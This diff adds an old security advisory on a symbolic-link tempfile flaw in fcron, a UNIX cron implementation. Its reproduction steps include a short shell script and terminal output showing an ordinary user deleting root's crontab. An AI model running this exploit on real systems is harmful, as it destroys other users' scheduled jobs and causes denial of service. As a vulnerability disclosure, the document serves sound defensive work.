@@ -1,0 +1,60 @@
+source: http://www.securityfocus.com/bid/2835/info
+
+FCron is an implementation of the popular UNIX 'cron' utility that runs user-specified programs at periodic scheduled times.
+
+fcron is vulnerable to symbolic link attacks.
+
+It is possible for an attacker to anticipate the expected name of an fcron tempfile. Attackers can create a symbolic link with an anticipated filename pointing to files on the system writable by the fcron group. This could allow an attacker to corrupt another user's crontab file, interfering with scheduled events and potentially creating a denial of service.
+
+In addition, the ability to cause deletion of user crontabs has been demonstrated by the discoverer.
+
+How to repeat:
+
+1. Install a crontab, for example for the root user:
+
+root# ls -l /var/spool/fcron/
+total 0
+root# echo '0 0 * * * echo test' | fcrontab -
+09:53:00 installing file /tmp/fcrontab.27301 for user root
+Modifications will be taken into account right now.
+root# ls -l /var/spool/fcron/
+total 2
+-rw------- 1 root root 110 May 7 09:53 root
+-rw------- 1 root fcron 20 May 7 09:53 root.orig
+
+
+2. As a normal user write and execute a script:
+
+uwe$ cat ~/x
+#! /bin/sh
+ln -s /var/spool/fcron/rm.root /tmp/fcrontab.$$
+exec fcrontab - <<EOF
+* * * * * false
+EOF
+uwe$ ./x
+09:55:55 installing file /tmp/fcrontab.27536 for user uwe
+09:55:55 User uwe can't read file "/tmp/fcrontab.27536": Permission denied
+
+3. As root look into the fcron spool directory:
+
+root# ls -l /var/spool/fcron/
+total 3
+-rw-r----- 1 uwe fcron 16 May 7 09:55 rm.root
+-rw------- 1 root root 110 May 7 09:53 root
+-rw------- 1 root fcron 20 May 7 09:53 root.orig
+
+4. As the normal user edit your crontab:
+
+uwe$ echo '* * * * * true' | fcrontab -
+09:59:15 installing file /tmp/fcrontab.27543 for user uwe
+Modifications will be taken into account at 10h00.
+
+5. As root wait up to a minute and look into the fcron spool directory:
+
+# ls -l /var/spool/fcron/
+total 3
+-rw------- 1 root fcron 20 May 7 09:53 root.orig
+-rw------- 1 root root 102 May 7 09:59 uwe
+-rw-r----- 1 fcron fcron 15 May 7 09:59 uwe.orig
+
+6. Root's crontab is gone, look into your backups. 
